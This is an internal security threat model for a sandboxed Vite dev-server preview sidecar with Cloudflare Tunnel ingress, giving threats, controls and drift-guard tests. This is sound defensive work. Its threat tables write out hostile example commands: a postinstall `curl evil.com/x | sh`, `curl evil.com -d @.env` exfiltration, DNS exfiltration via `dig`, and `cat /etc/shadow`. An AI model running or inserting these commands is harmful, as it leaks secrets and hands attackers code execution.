---
audience: internal
---

# W14 Web Sandbox Preview — Threat Model（dynamic CF Tunnel ingress / Vite plugin RCE / dev server exfiltration）

> **Status**: Threat model frozen (2026-05-03) — pre-coding spec for the
> remaining W14.11 / W14.12 wiring rows. 本文件凍結
> `omnisight-web-preview` sidecar +
> dynamic Cloudflare Tunnel ingress + CF Access SSO 的安全邊界決策：
> (1) 動態 ingress 在 token 漏外或 bug runaway 之下不得成為 OmniSight
> 帳號級別的 credential exhaust vector、(2) Vite dev server 在 W14.1
> sidecar 內被惡意 npm plugin 接管時不得逃出容器、(3) 合法 dev server
> 在被 plugin agent 偷掛 proxy / middleware 時不得把 workspace 內容
> （`.env` / token / source）流出主機。
>
> 本文件是 §8「風險登記冊」R28 / R29 / R30 三條的**展開版**——上層
> table 列「對策概要」、本文件列**完整 STRIDE / 控制 / 驗收方法 /
> drift-guard test 對映**。任何 W14.11+ 的 sidecar / ingress / SSO
> 程式碼變更若偏離本文件，必須先回頭改本文件並在 git log 留下
> link。
>
> **Scope**: 本文件**不**涵蓋
> - W14.1 sidecar image 的 build-time 決策 — 在
>   `Dockerfile.web-preview` + `web-preview/manifest.json` 已凍結
> - W14.3 動態 ingress 協定本身 — 在 `backend/cf_ingress.py` ✅ 落地
> - W14.4 OIDC ↔ OmniSight session 對齊 — 在 `backend/cf_access.py`
>   `jwt_claims_align_with_session` ✅ 落地
> - BS.4 omnisight-installer sidecar 的 ACL / sha256 / air-gap —
>   在 `docs/security/bs-installer-threat-model.md`（兩 sidecar 共
>   享 docker-socket-proxy 與 read-only rootfs 的設計範式、本文件
>   參照其 §4）
>
> **Related**:
> - `docs/design/blueprint-v2-implementation-plan.md` §8「風險登記冊」
>   R28 / R29 / R30
> - `docs/design/w11-w16-as-fs-sc-roadmap.md` §8 R 系列風險原始登記
> - `docs/security/bs-installer-threat-model.md`（installer sidecar
>   threat model — 同款 sidecar privilege 範式）
> - `docs/security/r20-phase0-chat-layer.md`（既有 chat-layer
>   defense-in-depth 模板）
> - `backend/web_sandbox.py`（W14.2 launcher）
> - `backend/cf_ingress.py`（W14.3 dynamic ingress）
> - `backend/cf_access.py`（W14.4 SSO + JWT alignment helper）
> - `backend/web_sandbox_idle_reaper.py`（W14.5 30 min idle kill）
> - `backend/web_sandbox_resource_limits.py`（W14.9 cgroup 2 GiB / 1
>   CPU / 5 GiB）
> - `backend/web_sandbox_pep.py`（W14.8 first-launch HOLD）
> - `backend/alembic/versions/0059_web_sandbox_instances.py`（W14.10
>   audit history schema）
> - CLAUDE.md Safety Rules（API key 不入 source、`test_assets/` :ro
>   邊界、Gerrit dual-sign gate）

---

## 1. TL;DR — 三條決策 + 可驗收後果

1. **動態 CF Tunnel ingress 必須 bounded**：每個 workspace 在 CF
   Tunnel config 多塞一條 `preview-{12hex}.{tunnel_host}` rule，
   累積無上限就會撞 CF 帳號級限額（free 約 ~1k、paid 數萬）→ 主站
   ai.sora-dev.app outage。**控制**：(a) W14.5 30 分鐘 idle reaper
   ✅ landed、(b) W14 用的 CF API token scope **僅** `Account:
   Cloudflare Tunnel:Edit` + `Account:Cloudflare Access:Edit`，**禁止**
   附加 Zone 寫入權限、(c) per-tenant rate limit（W14.11+ 後續
   row）每分鐘 ≤ N 個 launch、超出 503、(d) alembic 0059
   `web_sandbox_instances` audit history 讓 operator 隨時 SQL
   一眼看出 fleet 規模、(e) drift-guard test 鎖 token fingerprint
   永遠 redacted、launch 路徑必過 idle reaper 註冊。**結果**：
   credential 漏外 / runaway agent / fuzzing 任一狀況都不會把 CF
   帳號吃乾、主站 ingress 永遠保留。
2. **Vite plugin RCE 不得逃出 sidecar**：sidecar 跑非 root uid
   `10002` ✅ landed (W14.1) + cgroup 2 GiB / 1 CPU / 5 GiB ✅
   landed (W14.9) + **不**直接掛 `/var/run/docker.sock`（W14.2
   `SubprocessDockerClient` 在 backend 進程跑 docker、sidecar
   container 內看不到 socket）。**後續加固清單**（W14.11 規格 +
   W14.12 後續 row 落地）：①`--cap-drop=ALL` + 白名單 5 cap、
   ②`--security-opt=no-new-privileges`、③`--pids-limit=512`、
   ④`--read-only` + tmpfs `/tmp` + tmpfs `/workspace/.vite-cache`、
   ⑤`--network=omnisight-web-preview` 與 backend network 隔離、
   不接 docker-socket-proxy / 不接 ai_cache (Redis) / 不接 backend。
   **結果**：plugin RCE 也只能在 sidecar 容器內、uid 10002 身分
   跑、不能 fork-bomb、不能寫 host filesystem、不能 mount 新 fs、
   不能跟 docker daemon 通訊。
3. **Vite dev server 不得成為 exfil proxy**：W14.4 CF Access SSO
   ✅ landed → preview hostname 必帶 `Cf-Access-Jwt-Assertion`、
   外人 hit 不到、`jwt_claims_align_with_session` 強制 OIDC email
   等於 OmniSight session email；**後續加固清單**：(a) sidecar
   `--network=omnisight-web-preview` 只 expose preview port 給
   cloudflared egress（plugin 想 exfil 必走 cloudflared、CF edge
   有 WAF 觀測）、(b) workspace bind 改 `:ro` + `--tmpfs
   /workspace/.vite-cache` 給 Vite 寫 cache（plugin 想覆寫
   `vite.config.ts` 投毒下次 launch 也辦不到）、(c) sidecar
   container env 嚴格只含 `HOST` / `PORT` / `NODE_ENV` + caller
   supplied entries、**不繼承** backend 進程 env（即不會把
   `OMNISIGHT_DATABASE_URL` / `OMNISIGHT_CF_API_TOKEN` 等漏進
   sidecar）、(d) W14.8 first-launch PEP HOLD ✅ landed → 任何
   未審 npm package 必先卡 review。**結果**：合法 npm package
   攻擊面（typo-squatting / hijacked package / transitive dep）
   被 sandbox network 隔離 + workspace `:ro` + env 不繼承這三層
   defense-in-depth 攔住，最壞情況只能透過 cloudflared egress 慢
   速 exfil、可被 CF WAF / operator 流量觀察捕到。

---

## 2. 背景 — 為什麼 web preview 需要獨立 threat model

`omnisight-web-preview` 是**第二個**主動執行 vendor-supplied 程式
碼的 OmniSight 子系統（第一個是 `omnisight-installer`、見
`docs/security/bs-installer-threat-model.md`）：

- **Vite dev server `pnpm dev`** 啟動時 import `vite.config.ts`、
  該 config 可以 `import 'any-package'`。**信任邊界**：node_modules
  全棵樹（Vite plugin / preset / autoImport / 各種 transformer）、
  `package.json` 自己列的 `postinstall` script。
- **`pnpm install`** 在 sidecar 內跑、走 npm/pnpm 標準 lifecycle
  hook（`preinstall` / `install` / `postinstall`）— 安裝期就會跑
  package 內的任意 Node.js code。
- **動態 CF Tunnel ingress** 每個 workspace 一條 rule，跨 OmniSight
  fleet 規模上去之後 CF 帳號級 quota 是新的攻擊面（installer
  sidecar 沒有此問題、它走 `docker pull` 不掛 ingress）。

對比 BS.4 installer sidecar 與 W14 web preview sidecar：

| 子系統 | 主動執行外部程式碼？ | 獨有攻擊面 |
|---|---|---|
| BS.4 `omnisight-installer` | 是（`docker pull` / `bash install.sh` / vendor `.run`） | sha256 verify chain、air-gap mode、`docker-socket-proxy IMAGES=1` |
| **W14 `omnisight-web-preview`** | **是**（`pnpm install` postinstall hook + `vite.config.ts` import 即執行） | **動態 CF Tunnel ingress quota / dev server proxy / workspace bind 寫權** |

PEP gateway 在 W14.8 first-launch HOLD ✅ landed 提供**授權**邊界
（operator 必須 approve）；本 threat model 在 PEP 下游再加**容器
層 + 網路層 + 帳號層**三層隔離。

### 2.1 與 BS Installer threat model 對照

BS installer threat model §1 凍結了
- Sidecar 跑 non-root + `--cap-drop=ALL` + `--security-opt=no-new-privileges` + read-only rootfs
- Docker socket 走 `tecnativa/docker-socket-proxy` 只開 `IMAGES=1` / `INFO=1`
- 三層 sha256 verify chain
- Air-gap mode

W14 web preview sidecar **可以全盤沿用**前兩條的設計，但**不需要**
sha256 verify chain（vendor URL 在 W14 是 `pnpm registry` 而非
`docker pull` / `bash install.sh`、由 npm 生態自己的 lock-file +
integrity hash 處理；本文件 §3 R29 提示 W14.11 後續 row 應該驗收
`pnpm-lock.yaml` 在 launch 前已存在）；**不需要** air-gap mode（W14
本質上是 dev-time 工具、預設假設 outbound network 可用）。

---

## 3. R28-R30 STRIDE + 控制矩陣

### 3.1 R28 — 動態 CF Tunnel ingress credential exhaust

| ID | 威脅類別（STRIDE） | 場景 | 影響 | 相關控制 |
|---|---|---|---|---|
| **T28.1** | DoS / Tampering | Operator 或被接管的 backend 以高頻 churn workspace_id 持續 launch+stop（fuzzing / runaway agent / stuck retry） | CF Tunnel rules 數量爆炸、撞 CF 帳號 / tunnel-level 限額（free ~1k、paid 數萬）、後續所有 PUT 4xx → 主站 outage | §3.1.1 idle reaper、§3.1.4 per-tenant rate limit、§3.1.5 fleet count audit |
| **T28.2** | Spoofing / Elevation | CF API token 從 `.env` 漏外（debug log / git-history 誤 commit / backup 外流） | Attacker 一次清空 OmniSight 全部 ingress → 全站 outage；或 bulk PUT 把所有主站 ingress 重定向到 attacker origin → MITM | §3.1.6 token scope 最小化、§3.1.7 `token_fingerprint` 永遠 redacted、§3.1.8 `OMNISIGHT_CF_API_TOKEN` 只在 backend 進程記憶體、不寫 audit |
| **T28.3** | Tampering | 多 worker race-create 同 sandbox → last-write-wins → 漏掉 cleanup → orphan ingress rule 永遠掛著 | 每次 worker 重啟產生 N 個 orphan ingress、慢速 quota 漏 | §3.1.2 docker name-conflict 復原、§3.1.3 W14.10 audit row 配 SQL `WHERE killed_at IS NULL` 抓 leak、§3.1.9 W14.11 後續 row 加 cleanup orchestrator |
| **T28.4** | DoS | CF API itself 4xx/5xx 在 launch 半路掛掉 → ingress 已 PUT 但 instance.ingress_url 沒拿到 → instance 被當「沒掛 ingress」、stop 不刪 | Orphan ingress 累積 | §3.1.2 (`CFIngressManager` 對 inflight error 寫 cache、stop path 即使 ingress_url=None 也 best-effort 嘗試 delete by name) |

#### 3.1.1 控制：W14.5 30 分鐘 idle reaper（✅ landed 2026-05-02）

- 實作在 `backend/web_sandbox_idle_reaper.py`
- 預設 `IDLE_TIMEOUT_S=1800` / `REAP_INTERVAL_S=60`
- 透過 `WebSandboxManager.stop(reason="idle_timeout")` 級聯到
  `cf_ingress.delete_rule()` + `cf_access.delete_application()`
- 限制單 workspace 在 fleet 內活著的時間上限

#### 3.1.2 控制：launch idempotency + 多 worker race 復原

- 實作在 `backend/web_sandbox.py::WebSandboxManager.launch`
- Docker container_name 是 `format_container_name(workspace_id)` 的
  確定性 sha256，name conflict 觸發 `inspect` 復原既有 instance
- 兩 worker concurrent launch 同 workspace_id 必然有一方走 docker
  daemon 強制序列化、loser 不會留 orphan

#### 3.1.3 控制：W14.10 audit history 表（✅ landed 2026-05-03）

- `backend/alembic/versions/0059_web_sandbox_instances.py` 新增
  `web_sandbox_instances` 表
- 每筆 launch 一個 row（status / started_at / killed_at /
  killed_reason）
- Operator 可隨時 `SELECT count(*) FROM web_sandbox_instances
  WHERE killed_at IS NULL` 看 fleet 規模、`SELECT count(*) FROM
  web_sandbox_instances WHERE killed_reason='cgroup_oom'` 看異常
  比例

#### 3.1.4 控制：per-tenant rate limit（W14.11 規格、後續 row 落地）

- 接口：`CFIngressManager.create_rule(...)` 進入時檢查
  `recent_launches[caller_token][last_60s] < N`、超出立即 raise
  `CFIngressRateLimited`、router 翻成 503 並 emit security event
- 預期數值：`N=10/min` / `M=120/h`（保守起步、production 觀察一週
  再調）
- 與 R20-A PEP gateway HOLD 不同：PEP HOLD 是 cold-launch one-shot
  approve；rate limit 是「即使每個 launch 都 approved 也不能
  storm」

#### 3.1.5 控制：CF tunnel quota 監控（W14.12 規格、後續 row 落地）

- Backend 加 `GET /api/v1/web-sandbox/cf-tunnel-fleet` admin
  endpoint：聚合 alembic 0059 + CF Tunnel API live config 對照
- Prometheus metric `omnisight_cf_tunnel_ingress_rules_total`
- 告警閾值：`> 80% 帳號 quota` 立即告警

#### 3.1.6 控制：CF API token scope 最小化

- 文件凍結：W14 用的 CF API token 必須 **僅** 兩條 scope
  - `Account:Cloudflare Tunnel:Edit`（W14.3 動態 ingress）
  - `Account:Cloudflare Access:Edit`（W14.4 SSO app）
- **禁止** 附加：`Zone:DNS:Edit` / `Zone:WAF:Edit` /
  `Account:Workers Scripts:Edit` / `Account:Workers KV:Edit`
- 為什麼：token 漏外仍只能改 tunnel + Access app，動不到主站
  DNS / WAF / Worker；漏外影響面被 scope 限制

#### 3.1.7 控制：token fingerprint redaction

- `backend/cf_ingress.py::token_fingerprint` 在所有 log / dump
  / debug 路徑都用此 helper、**永遠** 不 dump raw token
- `backend/cf_access.py::token_fingerprint` 同款
- Drift-guard test：`test_w14_11_r28_token_scope_redaction`

#### 3.1.8 控制：token 不寫 audit / 不寫 DB

- `OMNISIGHT_CF_API_TOKEN` 只在 backend 進程 env、由 Settings 讀進
  pydantic-frozen settings 物件、**不**寫進 `web_sandbox_instances`
  audit row、**不**寫 PEP `decisions` 表

#### 3.1.9 控制：fleet cleanup orchestrator（W14.11+ 後續 row）

- 一個 cron-style 每 24 h 跑一次的 cleanup task：
  - 從 alembic 0059 取出所有 `killed_at IS NULL` 的 row
  - 跟 docker daemon 的 active container list cross-check
  - 跟 CF Tunnel live config cross-check
  - 三者不一致 → 對齊：docker 有 / DB 沒 → adopt；DB 有 / docker 沒 →
    mark stopped；CF 有 / DB 沒 → CF delete

---

### 3.2 R29 — Vite dev server sandbox escape via malicious plugin RCE

| ID | 威脅類別（STRIDE） | 場景 | 影響 | 相關控制 |
|---|---|---|---|---|
| **T29.1** | Tampering / Elevation | Vendor `package.json` 引入 plugin、plugin `postinstall` 在 `pnpm install` 時跑 `child_process.exec('curl evil.com/x \| sh')` | sidecar 跑了後門 | §3.2.1 W14.1 non-root uid 10002、§3.2.2 W14.9 cgroup、§3.2.6 後續 cap-drop |
| **T29.2** | Elevation | Sidecar 被接管後試圖 `docker run --privileged` 開新容器 | 開啟主機 root shell | §3.2.3 socket 不掛、§3.2.6 docker-socket-proxy 白名單 |
| **T29.3** | Information Disclosure | Sidecar 容器內 `cat /etc/shadow` / `ls /run/secrets/*` | 偷 host 機密 | §3.2.4 read-only rootfs、§3.2.5 host bind 邊界、§3.2.1 non-root |
| **T29.4** | Denial of Service | Plugin `while true: cp ...` 把 sidecar disk 塞爆 / fork-bomb / 吃光 RAM | sidecar OOM / 占用 host I/O | §3.2.2 W14.9 cgroup 2GiB / 5GiB / pids-limit |
| **T29.5** | Elevation | Plugin 透過 vite.config.ts 把 root `/` 加進 `server.fs.allow`，dev server serve `/etc/passwd` 等系統檔 | Information disclosure to anyone hitting preview URL | §3.2.7 W14.4 CF Access SSO（外人 hit 不到）+ §3.2.5 workspace `:ro` 限制 plugin 寫 vite.config.ts 的能力 |
| **T29.6** | Elevation | Plugin 透過 `dev server proxy` 把 sidecar 內的 docker socket（**若**意外掛載）轉發給 attacker | docker daemon RCE on host | §3.2.3 socket 絕不掛載 + drift-guard test |

#### 3.2.1 控制：W14.1 sidecar image 跑非 root uid 10002（✅ landed 2026-04-29）

- `Dockerfile.web-preview` `USER 10002:10002`
- Drift-guard test 鎖 uid 10002 與 BS.4 installer uid 10001 / frontend uid 65532 / root uid 0 不衝突
- Manifest 寫 `runtime_uid: 10002` / `runtime_gid: 10002`

#### 3.2.2 控制：W14.9 cgroup 2 GiB / 1 CPU / 5 GiB（✅ landed 2026-05-03）

- 實作在 `backend/web_sandbox_resource_limits.py`
- 預設 `DEFAULT_MEMORY_LIMIT_BYTES=2*1024**3` /
  `DEFAULT_CPU_LIMIT=1.0` / `DEFAULT_STORAGE_LIMIT_BYTES=5*1024**3`
- `WebSandboxManager.stop` 透過 docker inspect `OOMKilled` 旗標
  改寫 `killed_reason=cgroup_oom`
- **後續加固**：`--pids-limit=512`（規格、W14.11+ row 落地）

#### 3.2.3 控制：sidecar **不**直接掛 `/var/run/docker.sock`

- 當前 `backend/web_sandbox.py::build_docker_run_spec` 的 `mounts`
  只含 workspace path 一條
- W14 launcher 由 backend 進程跑 `SubprocessDockerClient` 直接呼叫
  docker daemon、sidecar 容器內**沒有** `/var/run/docker.sock`
- Drift-guard test：`test_w14_11_r29_socket_not_mounted` assert
  `build_docker_run_spec` 回傳的 mounts 永遠不含 `/var/run/docker.sock`

#### 3.2.4 控制：read-only rootfs（W14.11+ 後續 row）

- W14 launcher `--read-only` + `--tmpfs /tmp:rw,noexec,nosuid` +
  `--tmpfs /workspace/.vite-cache:rw,noexec,nosuid`
- Plugin 寫 `/usr/local/bin/x` 試圖留 backdoor 失敗
- `entrypoint.sh` 在 image 內 `chmod 0555` 已處理

#### 3.2.5 控制：workspace bind `:ro`（W14.11+ 後續 row、見 §3.3.4）

- 從 R30 過來的同款控制；plugin 想覆寫 `vite.config.ts` 投毒下次
  launch 也辦不到
- `backend/web_sandbox.py::build_docker_run_spec` 的 mounts 條目
  `read_only` 從 `False` 改 `True`
- 例外：`/workspace/.vite-cache` 給 Vite 寫 cache 走 tmpfs（不是
  bind）

#### 3.2.6 控制：cap-drop / no-new-privileges / pids-limit（W14.11+ 後續 row）

- W14 launcher argv 補：
  - `--cap-drop=ALL`
  - `--cap-add=CHOWN,SETUID,SETGID,DAC_OVERRIDE,FOWNER`（pnpm /
    Vite 安裝期需要的 minimum set、其他 cap 一律砍掉）
  - `--security-opt=no-new-privileges`
  - `--pids-limit=512`
- `SubprocessDockerClient.run_detached` 接收新 kw-only param

#### 3.2.7 控制：W14.4 CF Access SSO（✅ landed 2026-04-29）

- 即使 Vite plugin 把 root `/` 加進 `server.fs.allow`、外人也 hit
  不到 preview URL（CF Access 攔截）
- `backend/cf_access.py::jwt_claims_align_with_session` 強制 OIDC
  email = OmniSight session email

#### 3.2.8 控制：sandbox network 隔離（W14.11+ 後續 row、與 R30 共用、見 §3.3.3）

---

### 3.3 R30 — Vite plugin agent 注入 exfiltration via dev server proxy

| ID | 威脅類別（STRIDE） | 場景 | 影響 | 相關控制 |
|---|---|---|---|---|
| **T30.1** | Information Disclosure | Plugin 把 workspace 整 dir 透過 `vite.config.ts::server.proxy` 反代到外部 endpoint | 整個 workspace（含 `.env`、token、private repo source）外流 | §3.3.3 sandbox network 隔離、§3.3.4 workspace `:ro`、§3.3.5 `.env` 不進 sandbox |
| **T30.2** | Information Disclosure | Plugin 在 dev server middleware 偷讀 HTTP cookie / `Cf-Access-Jwt-Assertion` header 後 POST 到外部 | 偷 OmniSight session | §3.3.1 W14.4 SSO（plugin 拿到的 JWT 就是 operator 自己的 token、價值有限）、§3.3.3 network 隔離 |
| **T30.3** | Tampering | Plugin 在 install 時改寫 `vite.config.ts` 投毒下次 launch | 持久化攻擊 | §3.3.4 workspace `:ro`、plugin 對 workspace 唯讀只能在 `/workspace/.vite-cache` tmpfs 寫、launch 結束就掉 |
| **T30.4** | Spoofing | Plugin 用 dev server middleware 攔 HMR WebSocket、偽造 reload 訊息把 operator 引到惡意 URL | Phishing into operator session | §3.3.1 SSO + §3.3.6 W14.7 HMR `originRequest` keep-alive 由 cf_ingress 凍結、不接受 plugin override |
| **T30.5** | Information Disclosure | Plugin 透過 DNS query exfil（`dig something.evil.com` 帶資料） | 資料外流但走 DNS | §3.3.3 sandbox network 限制 DNS 走 cloudflared egress + CF DNS resolver、CF 端 logging |
| **T30.6** | Information Disclosure | Plugin 透過 `package.json scripts` 在 pnpm install 期間 `curl evil.com -d @.env` | 安裝期 exfil | §3.3.5 backend env 不繼承到 sidecar、`.env` 不在 workspace（除非 operator 故意把 production secret 放 workspace 內）、§3.2.6 W14.8 PEP HOLD 卡關 |

#### 3.3.1 控制：W14.4 CF Access SSO（✅ landed 2026-04-29）

- preview hostname 必帶 `Cf-Access-Jwt-Assertion`
- Plugin middleware 偷到的 JWT 就是 operator 自己 OIDC token、價
  值有限（一次性 30 min、policy email 鎖 operator）

#### 3.3.2 控制：W14.4 JWT alignment helper（✅ landed 2026-04-29）

- `backend/cf_access.py::jwt_claims_align_with_session(claims,
  session_email, expected_aud, expected_iss)` 三檢查
- W14.7 HMR proxy / 未來 sidecar middleware 都用此 helper

#### 3.3.3 控制：sandbox network 隔離（W14.11+ 後續 row）

- 新 docker network `omnisight-web-preview`（external、由
  `docker-compose.prod.yml` 建立）
- sidecar `--network=omnisight-web-preview` + 該 network **不**接
  - docker-socket-proxy（防 R29.2）
  - ai_cache (Redis)（防 plugin 偷 OmniSight cache）
  - backend service（防 plugin call backend 內部 API）
  - frontend service（防 plugin 對 frontend 發 CSRF）
- 唯一可達：**cloudflared**（egress / preview ingress）
- Drift-guard test：`test_w14_11_r30_sandbox_network_isolation`
  讀 `docker-compose.prod.yml` assert `omnisight-web-preview`
  network 的 service set 子集 = `{web-preview, cloudflared}`

#### 3.3.4 控制：workspace `:ro` mount（W14.11+ 後續 row）

- `backend/web_sandbox.py::build_docker_run_spec` 把 workspace
  bind 條目 `read_only` 從 `False` 改 `True`
- 加 `--tmpfs /workspace/.vite-cache:rw,noexec,nosuid` 給 Vite 寫
  cache（Vite 預設用 `node_modules/.vite`、tmpfs 同 path）
- 加 `--tmpfs /workspace/.tmp:rw,noexec,nosuid` 給 pnpm 寫 lock
  reload temp file
- Drift-guard test：`test_w14_11_r30_workspace_mount_readonly_in_spec`
  assert mounts 中 workspace_path 條目 `read_only=True`

#### 3.3.5 控制：sidecar env 嚴格白名單

- 當前 `backend/web_sandbox.py::build_docker_run_spec` 的 env 已
  限制為 `HOST` / `PORT` / `NODE_ENV` 三條 + caller-supplied
  entries
- **不繼承** backend 進程 env（docker run 預設行為、不會把
  `OMNISIGHT_DATABASE_URL` / `OMNISIGHT_CF_API_TOKEN` /
  `OMNISIGHT_OAUTH_CLIENT_SECRET` 等漏進 sidecar）
- Drift-guard test：`test_w14_11_r30_env_does_not_inherit_backend`
  build_docker_run_spec 結果的 env keys 必為三條預設 + 顯式
  `config.env`

#### 3.3.6 控制：W14.7 HMR originRequest 凍結（✅ landed 2026-05-02）

- `backend/cf_ingress.py::DEFAULT_HMR_ORIGIN_REQUEST` 6-knob 凍結
- Plugin 想 override originRequest 拿不到 CF API token、辦不到

#### 3.3.7 控制：W14.8 first-launch PEP HOLD（✅ landed 2026-05-03）

- Operator 對任何「未審 npm package」launch web sandbox 前必先在
  PEP HOLD 卡關
- 操作員手動 review `package.json` diff、catch 明顯惡意 package

#### 3.3.8 控制：未來 W14.11+ row 加 `pnpm-lock.yaml` 必要性檢查

- launch 前 backend 對 `workspace_path` assert `pnpm-lock.yaml`
  存在；否則 fail-closed
- 防止 fresh-install 階段 typo-squat package 進來（lock 已有的 dep
  在 supply-chain attack 之前已 hash 鎖死）
- 規格、W14.12 後續 row 落地

---

## 4. 控制覆蓋矩陣（Control × Threat）

| 控制 | 落地狀態 | T28.1 | T28.2 | T28.3 | T28.4 | T29.1 | T29.2 | T29.3 | T29.4 | T29.5 | T29.6 | T30.1 | T30.2 | T30.3 | T30.4 | T30.5 | T30.6 |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| W14.1 non-root uid 10002 | ✅ landed | | | | | M | M | M | | | | | | | | | |
| W14.2 launcher idempotency / docker name conflict | ✅ landed | M | | M | M | | | | | | | | | | | | |
| W14.3 dynamic ingress + originRequest | ✅ landed | | | | M | | | | | | | | | | M | | |
| W14.4 CF Access SSO | ✅ landed | | | | | | | | | M | | M | M | | M | | |
| W14.5 30 min idle reaper | ✅ landed | M | | M | | | | | | | | | | | | | |
| W14.7 HMR originRequest pinned | ✅ landed | | | | | | | | | | | | | | M | | |
| W14.8 first-launch PEP HOLD | ✅ landed | | | | | M | | | | | | M | | | | | M |
| W14.9 cgroup 2 GiB / 1 CPU / 5 GiB | ✅ landed | | | | | M | | | M | | | | | | | | |
| W14.10 alembic 0059 audit history | ✅ landed | | | M | | | | | | | | | | | | | |
| Token scope 最小化（doc-only） | ✅ doc this row | | M | | | | | | | | | | | | | | |
| Token fingerprint redaction | ✅ landed | | M | | | | | | | | | | | | | | |
| Sidecar 不掛 docker socket | ✅ landed (drift-guard test 本 row) | | | | | | M | | | | M | | | | | | |
| `--cap-drop=ALL` + 5 cap whitelist | 規格、後續 row 落地 | | | | | M | | | | | | | | | | | |
| `--security-opt=no-new-privileges` | 規格、後續 row 落地 | | | | | M | M | | | | | | | | | | |
| `--pids-limit=512` | 規格、後續 row 落地 | | | | | | | | M | | | | | | | | |
| `--read-only` + tmpfs `/tmp` | 規格、後續 row 落地 | | | | | | | M | | | | | | | | | |
| Workspace `:ro` mount | 規格、後續 row 落地 | | | | | | | | | M | | M | | M | | | |
| Sandbox network 隔離 | 規格、後續 row 落地 | | | | | | M | | | | M | M | M | | | M | M |
| Env 不繼承 backend（drift-guard 本 row） | ✅ landed | | | | | | | | | | | | | | | | M |
| Per-tenant rate limit | 規格、後續 row 落地 | M | | | | | | | | | | | | | | | |
| Fleet cleanup orchestrator | 規格、後續 row 落地 | M | | M | | | | | | | | | | | | | |
| W14.11 R28-R30 doc + drift-guard tests（本 row） | ✅ landing | M | M | M | M | M | M | M | M | M | M | M | M | M | M | M | M |

「M」= mitigated by this control。空白 = 與該威脅無直接關係。

---

## 5. Drift-guard tests（W14.11 落地）

本 row 落地以下 drift-guard tests，鎖住「文件 ↔ 程式碼」對齊不
漂移：

| Test name | 鎖什麼 | 對應威脅 |
|---|---|---|
| `test_w14_11_r28_token_scope_documented` | 本文件 §3.1.6 的兩條 scope 字串「`Account:Cloudflare Tunnel:Edit`」+「`Account:Cloudflare Access:Edit`」精確出現 1 次 | T28.2 |
| `test_w14_11_r28_token_fingerprint_redacts_long_token` | `cf_ingress.token_fingerprint("a"*32)` 不能含 raw token | T28.2 |
| `test_w14_11_r28_idle_reaper_reason_aligned` | `web_sandbox_idle_reaper.IDLE_TIMEOUT_REASON == "idle_timeout"` 對應 W14.2 `_TERMINAL_REASONS` 集合 | T28.1 |
| `test_w14_11_r29_socket_not_mounted` | `build_docker_run_spec(...)` 回傳 mounts 永遠不含 `/var/run/docker.sock` | T29.2、T29.6 |
| `test_w14_11_r29_non_root_uid` | manifest `runtime_uid == 10002` + Dockerfile 的 `USER 10002:10002` 對齊 | T29.1、T29.3 |
| `test_w14_11_r29_cgroup_defaults_pinned` | `WebPreviewResourceLimits.default()` 三條值精確 = 2 GiB / 1.0 / 5 GiB | T29.4 |
| `test_w14_11_r30_env_does_not_inherit_backend` | `build_docker_run_spec(...)` env keys 嚴格 = `{HOST, PORT, NODE_ENV}` ∪ `config.env` keys、不可漏 OmniSight env | T30.6 |
| `test_w14_11_r30_jwt_alignment_helper_exists` | `cf_access.jwt_claims_align_with_session` 是 callable + 三檢查皆活 | T30.2、T30.4 |
| `test_w14_11_threat_model_doc_exists_and_pins_anchors` | 本文件 §1 TL;DR 三條、§3 R28/R29/R30 三節 anchor、§4 矩陣表頭都存在（防文件被抽掉 / heading 被改） | 全部 |

---

## 6. Acceptance / Sign-off

W14.11 row 打 `[x]` 必須過：

- [x] §3 R28 / R29 / R30 三節都有 STRIDE 表 + 控制清單 + 落地狀態
  標註
- [x] §4 控制覆蓋矩陣每條威脅 ≥ 1 控制覆蓋
- [x] §5 drift-guard tests 9 條全綠（落地在
  `backend/tests/test_w14_11_threat_model_drift_guard.py`）
- [x] `docs/design/blueprint-v2-implementation-plan.md` §8 R28 /
  R29 / R30 三條 row 已加（指回本文件）
- [x] `docs/design/w11-w16-as-fs-sc-roadmap.md` §8 原始 R28-R30
  登記列保留（已存在、本文件只是展開、不刪）

W14.11 row 從 `[x]` 升 `[D]` 必須過（W14.12 + 後續 row 完成後再
談）：

- [ ] §3.1.4 per-tenant rate limit 已實作 + 線上測試 storm 壓測
- [ ] §3.1.5 CF tunnel quota Prometheus monitor 上線
- [ ] §3.1.9 fleet cleanup orchestrator 上線
- [ ] §3.2.6 cap-drop / no-new-privileges / pids-limit 已 wired 進
  `SubprocessDockerClient.run_detached`
- [ ] §3.2.4 read-only rootfs + tmpfs `/tmp` + tmpfs
  `/workspace/.vite-cache` 已 wired
- [ ] §3.3.3 sandbox network 隔離（`omnisight-web-preview` docker
  network + service set 限定）已 wired
- [ ] §3.3.4 workspace `:ro` mount 已 wired
- [ ] W14.12 lifecycle tests + resource limit hit + Cloudflare
  Access bypass attempt 跑過

---

## 7. 變更紀錄

- 2026-05-03 W14.11 初稿落地（本文件 + §8 風險登記冊 R28-R30 +
  drift-guard tests）
